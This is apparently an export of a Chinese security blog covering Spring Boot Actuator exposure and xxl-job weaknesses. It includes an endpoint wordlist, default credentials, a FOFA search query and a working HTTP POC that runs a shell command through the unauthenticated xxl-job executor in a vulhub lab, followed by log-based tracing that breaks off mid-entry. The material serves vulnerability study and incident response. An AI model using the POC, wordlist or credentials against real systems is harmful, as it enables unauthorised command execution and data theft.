    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Actuator是Spring Boot提供的服务监控和管理中间件，默认配置会出现接口未授权访问，导致敏感信息泄露，部分接口还会泄露网站流量信息和内存信息等</p><h2 id="漏洞链接"><a href="#漏洞链接" class="headerlink" title="漏洞链接"></a>漏洞链接</h2><h2 id="常见端点及其作用"><a href="#常见端点及其作用" class="headerlink" title="常见端点及其作用"></a>常见端点及其作用</h2><table><thead><tr><th>路径</th><th>是否默认启用</th><th>功能描述</th></tr></thead><tbody><tr><td>&#x2F;auditevents</td><td>是</td><td>显示当前应用程序的审计事件信息</td></tr><tr><td>&#x2F;beans</td><td>是</td><td>显示一个应用中所有Spring Beans的完整列表</td></tr><tr><td>&#x2F;conditions</td><td>是</td><td>显示配置类和自动配置类的状态及它们被应用或未被应用的原因</td></tr><tr><td>&#x2F;configprops</td><td>是</td><td>显示一个所有@ConfigurationProperties的集合列表</td></tr><tr><td>&#x2F;env</td><td>是</td><td>显示来自Spring的 ConfigurableEnvironment的属性，存在数据库等敏感信息</td></tr><tr><td>&#x2F;flyway</td><td>是</td><td>显示数据库迁移路径（如果存在）</td></tr><tr><td>&#x2F;health</td><td>是</td><td>显示应用的健康信息（当使用一个未认证连接访问时显示一个简单的’status’，使用认证连接访问则显示全部信息详情）</td></tr><tr><td>&#x2F;info</td><td>是</td><td>显示任意的应用信息</td></tr><tr><td>&#x2F;liquibase</td><td>是</td><td>展示任何Liquibase数据库迁移路径（如果存在）</td></tr><tr><td>&#x2F;metrics</td><td>是</td><td>展示当前应用的metrics信息</td></tr><tr><td>&#x2F;mappings</td><td>是</td><td>显示一个所有@RequestMapping路径的集合列表</td></tr><tr><td>&#x2F;scheduledtasks</td><td>是</td><td>显示应用程序中的计划任务</td></tr><tr><td>&#x2F;sessions</td><td>否</td><td>允许从Spring会话支持的会话存储中检索和删除用户会话</td></tr><tr><td>&#x2F;shutdown</td><td>否</td><td>允许应用以优雅的方式关闭（默认情况下不启用）</td></tr><tr><td>&#x2F;threaddump</td><td>是</td><td>执行一个线程dump</td></tr><tr><td>&#x2F;heapdump</td><td>是</td><td>返回一个GZip压缩的hprof堆dump文件</td></tr><tr><td>&#x2F;jolokia</td><td>是</td><td>通过HTTP暴露JMX beans（当Jolokia在类路径上时，WebFlux不可用）</td></tr><tr><td>&#x2F;logfile</td><td>是</td><td>返回日志文件内容（如果设置了logging.file或logging.path属性的话），支持使用HTTP Range头接收日志文件内容的部分信息</td></tr><tr><td>&#x2F;prometheus</td><td>是</td><td>以可以被Prometheus服务器抓取的格式显示metrics信息</td></tr></tbody></table><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs bash">/auth/actuator/env<br>/admin/actuator/env<br>actuator<br>actuator/auditLog<br>actuator/auditevents<br>actuator/autoconfig<br>actuator/beans<br>actuator/caches<br>actuator/conditions<br>actuator/configurationMetadata<br>actuator/configprops<br>actuator/dump<br>actuator/env<br>actuator/events<br>actuator/exportRegisteredServices<br>actuator/features<br>actuator/flyway<br>actuator/health<br>actuator/heapdump<br>actuator/healthcheck<br>actuator/heapdump<br>actuator/httptrace<br>actuator/hystrix.stream<br>actuator/info<br>actuator/integrationgraph<br>actuator/jolokia<br>actuator/logfile<br>actuator/loggers<br>actuator/loggingConfig<br>actuator/liquibase<br>actuator/metrics<br>actuator/mappings<br>actuator/scheduledtasks<br>actuator/swagger-ui.html<br>actuator/prometheus<br>actuator/refresh<br>actuator/registeredServices<br>actuator/releaseAttributes<br>actuator/resolveAttributes<br>actuator/scheduledtasks<br>actuator/sessions<br>actuator/springWebflow<br>actuator/shutdown<br>actuator/sso<br>actuator/ssoSessions<br>actuator/statistics<br>actuator/status<br>actuator/threaddump<br>actuator/trace<br>auditevents<br>autoconfig<br>api.html<br>api/index.html<br>api/swagger-ui.html<br>api/v2/api-docs<br>api-docs<br>beans<br>caches<br>cloudfoundryapplication<br>conditions<br>configprops<br>distv2/index.html<br>docs<br>druid/index.html<br>druid/login.html<br>druid/websession.html<br>dubbo-provider/distv2/index.html<br>dump<br>entity/all<br><span class="hljs-built_in">env</span><br><span class="hljs-built_in">env</span>/(name)<br>eureka<br>flyway<br>gateway/actuator<br>gateway/actuator/auditevents<br>gateway/actuator/beans<br>gateway/actuator/conditions<br>gateway/actuator/configprops<br>gateway/actuator/env<br>gateway/actuator/health<br>gateway/actuator/heapdump<br>gateway/actuator/httptrace<br>gateway/actuator/hystrix.stream<br>gateway/actuator/info<br>gateway/actuator/jolokia<br>gateway/actuator/logfile<br>gateway/actuator/loggers<br>gateway/actuator/mappings<br>gateway/actuator/metrics<br>gateway/actuator/scheduledtasks<br>gateway/actuator/swagger-ui.html<br>gateway/actuator/threaddump<br>gateway/actuator/trace<br>health<br>heapdump<br>heapdump.json<br>httptrace<br>hystrix<br>hystrix.stream<br>info<br>integrationgraph<br>jolokia<br>jolokia/list<br>liquibase<br>list<br>logfile<br>loggers<br>liquibase<br>metrics<br>mappings<br>monitor<br>prometheus<br>refresh<br>scheduledtasks<br>sessions<br>shutdown<br>spring-security-oauth-resource/swagger-ui.html<br>spring-security-rest/api/swagger-ui.html<br>static/swagger.json<br>sw/swagger-ui.html<br>swagger<br>swagger/codes<br>swagger/index.html<br>swagger/static/index.html<br>swagger/swagger-ui.html<br>swagger-dubbo/api-docs<br>swagger-ui<br>swagger-ui.html<br>swagger-ui/html<br>swagger-ui/index.html<br>system/druid/index.html<br>threaddump<br>template/swagger-ui.html<br>trace<br>user/swagger-ui.html<br>version<br>v1.1/swagger-ui.html<br>v1.2/swagger-ui.html<br>v1.3/swagger-ui.html<br>v1.4/swagger-ui.html<br>v1.5/swagger-ui.html<br>v1.6/swagger-ui.html<br>v1.7/swagger-ui.html<br>/v1.8/swagger-ui.html<br>/v1.9/swagger-ui.html<br>/v2.0/swagger-ui.html<br>v2.1/swagger-ui.html<br>v2.2/swagger-ui.html<br>v2.3/swagger-ui.html<br>v2/swagger.json<br>webpage/system/druid/index.html<br>%20/swagger-ui.html<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] 对于Spring Boot的渗透姿势 曾哥  2023-01-26</p><p><a href="https://blog.zgsec.cn/archives/129.html">https://blog.zgsec.cn/archives/129.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>xxl-job_base</title>
    <link href="/2024/06/05/security/secvulns/xxl-job/xxl-job_base/"/>
    <url>/2024/06/05/security/secvulns/xxl-job/xxl-job_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="默认账号密码"><a href="#默认账号密码" class="headerlink" title="默认账号密码"></a>默认账号密码</h2><p>admin&#x2F;123456</p><h2 id="服务指纹"><a href="#服务指纹" class="headerlink" title="服务指纹"></a>服务指纹</h2><p>管理端 8080 端口</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">PORT     STATE SERVICE<br><span class="hljs-number">8080</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>-proxy<br></code></pre></td></tr></table></figure><p>执行器端口 9999 端口</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-keyword">PORT</span>     STATE SERVICE<br><span class="hljs-number">9999</span>/tcp <span class="hljs-keyword">open</span>  abyss<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>xxl-job</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxl-job_accessToken_auth_bypass</title>
    <link href="/2024/06/05/security/secvulns/xxl-job/xxl-job_accessToken_auth_bypass/"/>
    <url>/2024/06/05/security/secvulns/xxl-job/xxl-job_accessToken_auth_bypass/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>XXL-JOB 是一个分布式任务调度平台，用于定时执行和管理任务。在 XXL-JOB 中，该框架用于调度通讯的 accessToken 并不是随机生成，并且其默认值是存储在 application.properties 配置文件中，导致攻击者可以利用默认的 accessToken 访问调度中心。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>以下是 XXL-JOB 调度中心默认 accessToken 存在鉴权绕过 的危害：</p><p>1、如果 XXL-JOB 使用默认 accessToken，攻击者可能轻松地登录到控制台，并获得对任务调度系统的控制权。</p><p>2、未经授权的任务执行：攻击者可以使用默认 accessToken 登录到 XXL-JOB 控制台，通过创建、修改或删除任务，从而执行未经授权的操作，可能导致数据丢失、任务执行错误或其他问题。</p><p>3、数据泄露：攻击者可以使用默认 accessToken 登录到 XXL-JOB 控制台查看任务执行日志、配置信息和其他敏感数据，可能导致敏感信息泄露。</p><p>4、恶意任务执行：攻击者可以使用默认 accessToken 创建恶意任务，例如执行恶意代码或蠕虫，从而对系统或网络进行攻击。</p><p>5、资源滥用：攻击者可以使用默认 accessToken 登录到控制台并创建大量任务，导致资源滥用，影响系统的正常运行。</p><h2 id="测试环境部署"><a href="#测试环境部署" class="headerlink" title="测试环境部署"></a>测试环境部署</h2><p>1、下载xxl-job镜像</p><p>docker pull xuxueli&#x2F;xxl-job-admin:2.3.1</p><p>2、下载mysql镜像</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1、修改默认 accessToken：XXL-JOB 为提升系统安全性，对调度中心和执行器进行安全性校验，双方 accessToken 匹配才允许通讯，所以修改 accessToken 也需要在调度中心与执行器上同步修改。 修改配置文件：application.properties</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">xxl.job.accessToken=default_token<br></code></pre></td></tr></table></figure><p>2、限制访问控制：通常情况下XXL-JOB 并不需要开放互联网所有用户访问权限。可以通过配置ACL或防火墙规则来确保只有必要的用户和系统可以访问XXL-JOB，以防止系统受到其它类型的攻击。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>xxl-job</tag>
      
      <tag>不安全的配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxl-job_executor_unauth</title>
    <link href="/2024/06/05/security/secvulns/xxl-job/xxl-job_executor_unauth/"/>
    <url>/2024/06/05/security/secvulns/xxl-job/xxl-job_executor_unauth/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="XXL-JOB简介"><a href="#XXL-JOB简介" class="headerlink" title="XXL-JOB简介"></a>XXL-JOB简介</h1><p>XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。XXL-JOB分为admin和executor两端，前者为后台管理页面，后者是任务执行的客户端。</p><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>executor默认没有配置认证，未授权的攻击者可以通过RESTful API执行任意命令。</p><h1 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h1><h1 id="漏洞级别"><a href="#漏洞级别" class="headerlink" title="漏洞级别"></a>漏洞级别</h1><p>高危</p><h1 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h1><p>XXL-JOB &lt;&#x3D; 2.2.0</p><h1 id="漏洞指纹"><a href="#漏洞指纹" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h1><p>请求 <a href="http://ip/">http://ip</a>:port&#x2F;run，会存在如下报错信息</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&#123;&quot;<span class="hljs-selector-tag">code</span>&quot;:<span class="hljs-number">500</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;invalid request, HttpMethod not support.&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>请求 <a href="http://ip/">http://ip</a>:port，admin端-调度中心的HTML页面中会存在“任务调度中心”或者“调度中心”字符</p><p>fofa 查询语法</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;invalid request, HttpMethod not support.&quot;</span><br></code></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>使用 vulhub 启动 XXL-JOB 2.2.0版本</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker compose up -d</span><br></code></pre></td></tr></table></figure><p>会创建 3 个容器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@nvm-<span class="hljs-number">17</span>axtnbnqb3r0:/opt/vulhub/xxl-job/unacc# docker ps<br><span class="hljs-attribute">CONTAINER</span> ID   IMAGE                           COMMAND                  CREATED          STATUS          PORTS                                       NAMES<br><span class="hljs-attribute">a00a5f25370e</span>   vulhub/xxl-job:<span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>-executor   <span class="hljs-string">&quot;/docker-entrypoint.…&quot;</span>   <span class="hljs-number">57</span> seconds ago   Up <span class="hljs-number">56</span> seconds   <span class="hljs-number">0.0.0.0:9999</span>-&gt;<span class="hljs-number">9999</span>/tcp, :::<span class="hljs-number">9999</span>-&gt;<span class="hljs-number">9999</span>/tcp   unacc_executor_1<br><span class="hljs-attribute">89f73447befd</span>   vulhub/xxl-job:<span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>-admin      <span class="hljs-string">&quot;/docker-entrypoint.…&quot;</span>   <span class="hljs-number">58</span> seconds ago   Up <span class="hljs-number">57</span> seconds   <span class="hljs-number">0.0.0.0:8080</span>-&gt;<span class="hljs-number">8080</span>/tcp, :::<span class="hljs-number">8080</span>-&gt;<span class="hljs-number">8080</span>/tcp   unacc_admin_1<br><span class="hljs-attribute">1283faf832f6</span>   mysql:<span class="hljs-number">5</span>.<span class="hljs-number">7</span>                       <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">58</span> seconds ago   Up <span class="hljs-number">58</span> seconds   <span class="hljs-number">3306</span>/tcp, <span class="hljs-number">33060</span>/tcp                         unacc_db_1<br></code></pre></td></tr></table></figure><p>8080 端口对应的是管理端-调度中心</p><p>9999 端口对应的是执行器</p><h2 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/run</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.217.11.22:9999<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>365<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;jobId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;executorHandler&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;demoJobHandler&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;executorParams&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;demoJobHandler&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;executorBlockStrategy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;COVER_EARLY&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;executorTimeout&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;logId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;logDateTime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1586629003729</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;glueType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;GLUE_SHELL&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;glueSource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;touch /tmp/success&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;glueUpdatetime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1586699003758</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;broadcastIndex&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">  <span class="hljs-attr">&quot;broadcastTotal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>执行成功后会返回</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">content-type</span><span class="hljs-punctuation">: </span>text/html;charset=UTF-8<br><span class="hljs-attribute">content-length</span><span class="hljs-punctuation">: </span>12<br><br><span class="language-css">&#123;&quot;<span class="hljs-selector-tag">code</span>&quot;:<span class="hljs-number">200</span>&#125;</span><br></code></pre></td></tr></table></figure><p>进入 executor 容器中查看&#x2F;tmp目录，会存在 success 文件</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@nvm</span><span class="hljs-number">-17</span><span class="hljs-symbol">axtnbnqb3r0:</span>/tmp<span class="hljs-comment"># docker exec -it a00a5f25370e /bin/bash</span><br>root<span class="hljs-variable">@a00a5f25370e</span><span class="hljs-symbol">:/usr/src</span><span class="hljs-comment">#</span><br>root<span class="hljs-variable">@a00a5f25370e</span><span class="hljs-symbol">:/usr/src</span><span class="hljs-comment">#</span><br>root<span class="hljs-variable">@a00a5f25370e</span><span class="hljs-symbol">:/usr/src</span><span class="hljs-comment"># cd /tmp</span><br>root<span class="hljs-variable">@a00a5f25370e</span><span class="hljs-symbol">:/tmp</span><span class="hljs-comment"># ls</span><br>hsperfdata_root  success  tomcat-docbase.<span class="hljs-number">7225564217480910333.8081</span>  tomcat.<span class="hljs-number">2705002425704348088.8081</span> <br></code></pre></td></tr></table></figure><h3 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h3><p>该POC使用的是 RESTful API ，XXL-JOB 低于 2.2.0 版本没有这个API，需要使用 Hessian反序列化来执行命令</p><h1 id="攻击溯源排查"><a href="#攻击溯源排查" class="headerlink" title="攻击溯源排查"></a>攻击溯源排查</h1><h2 id="docker环境"><a href="#docker环境" class="headerlink" title="docker环境"></a>docker环境</h2><h3 id="容器日志排查-推荐"><a href="#容器日志排查-推荐" class="headerlink" title="容器日志排查(推荐)"></a>容器日志排查(推荐)</h3><p>日志位置：</p><p>var&#x2F;log&#x2F;xxl-job</p><p>cat var&#x2F;log&#x2F;xxl-job&#x2F;2020-04-11&#x2F;1.log 可以看到执行job的时间（2023-10-08 08:16:22）和具体脚本（&#x2F;var&#x2F;log&#x2F;xxl-job&#x2F;gluesource&#x2F;1_1586699003758.sh）</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">root@a00a5f25370e:/var/<span class="hljs-built_in">log</span>/xxl-job/<span class="hljs-number">2020</span>-<span class="hljs-number">04</span>-<span class="hljs-number">11</span># <span class="hljs-keyword">cat</span> <span class="hljs-number">1</span>.<span class="hljs-built_in">log</span><br><span class="hljs-number">2023</span>-<span class="hljs-number">10</span>-<span class="hljs-number">08</span> <span class="hljs-number">08</span>:<span class="hljs-number">16</span>:<span class="hljs-number">22</span> [<span class="hljs-keyword">com</span>.xxl.job.core.thread.JobThread#run]-[<span class="hljs-number">124</span>]-[Thread-<span class="hljs-number">8</span>] <span class="hljs-symbol">&lt;br&gt;</span>----------- xxl-job job <span class="hljs-keyword">execute</span> start -----------<span class="hljs-symbol">&lt;br&gt;</span>----------- Param:demoJobHandler<br><span class="hljs-number">2023</span>-<span class="hljs-number">10</span>-<span class="hljs-number">08</span> <span class="hljs-number">08</span>:<span class="hljs-number">16</span>:<span class="hljs-number">22</span> [<span class="hljs-keyword">com</span>.xxl.job.core.handler.impl.ScriptJobHandler#execute]-[<span class="hljs-number">81</span>]-[Thread-<span class="hljs-number">8</span>] ----------- script <span class="hljs-keyword">file</span>:/var/<span class="hljs-built_in">log</span>/xxl-job/gluesource/<span class="hljs-number">1</span>_1586699003758.<span class="hljs-keyword">sh</span> -----------<br><span class="hljs-number">2023</span>-<span class="hljs-number">10</span>-<span class="hljs-number">08</span> <span class="hljs-number">08</span>:<span class="hljs-number">16</span>:<span class="hljs-number">22</span> [<span class="hljs-keyword">com</span>.xxl.job.core.thread.JobThread#run]-[<span class="hljs-number">164</span>]-[Thread-<span class="hljs-number">8</span>] <span class="hljs-symbol">&lt;br&gt;</span>----------- xxl-job job <span class="hljs-keyword">execute</span> end(<span class="hljs-keyword">finish</span>) -----------<span class="hljs-symbol">&lt;br&gt;</span>----------- ReturnT:ReturnT [code=<span class="hljs-number">200</span>, msg=null, content=null]<br><span class="hljs-number">2023</span>-<span class="hljs-number">10</span>-<span class="hljs-number">08</span> <span class="hljs-number">08</span>:<span class="hljs-number">16</span>:<span class="hljs-number">22</span> [<span class="hljs-keyword">com</span>.xxl.job.core.thread.TriggerCallbackThread#callbackLog]-[<span class="hljs-number">191</span>]-[xxl-job, executor TriggerCallbackThread] <span class="hljs-symbol">&lt;br&gt;</span>----------- xxl-job job callback <span class="hljs-keyword">finish</span>.<br></code></pre></td></tr></table></figure><p>查看执行的具体脚本 &#x2F;var&#x2F;log&#x2F;xxl-job&#x2F;gluesource&#x2F;1_1586699003758.sh</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@a00a5f25370e</span><span class="hljs-symbol">:/var/log/xxl-job/</span><span class="hljs-number">2020</span><span class="hljs-number">-04</span><span class="hljs-number">-11</span><span class="hljs-comment"># cat /var/log/xxl-job/gluesource/1_1586699003758.sh</span><br>touch /tmp/successroot<span class="hljs-variable">@a00a5f25370e</span><span class="hljs-symbol">:/var/log/xxl-job/</span><span class="hljs-number">2020</span><span class="hljs-number">-04</span><span class="hljs-number">-11</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="docker日志排查"><a href="#docker日志排查" class="headerlink" title="docker日志排查"></a>docker日志排查</h3><p>docker logs 容器id -f</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">root<span class="hljs-title">@nvm-17axtnbnqb3r0</span>:/tmp# docker logs a<span class="hljs-number">00</span>a<span class="hljs-number">5</span>f<span class="hljs-number">25370</span>e -f<br><span class="hljs-number">08</span>:<span class="hljs-number">16</span>:<span class="hljs-number">22.441</span> logback [xxl-rpc<span class="hljs-punctuation">,</span> EmbedServer bizThreadPool<span class="hljs-number">-466308793</span>] INFO  <span class="hljs-keyword">c</span>.<span class="hljs-keyword">x</span>.job.core.executor.XxlJobExecutor - &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; xxl-job regist JobThread success<span class="hljs-punctuation">,</span> jobId:<span class="hljs-number">1</span><span 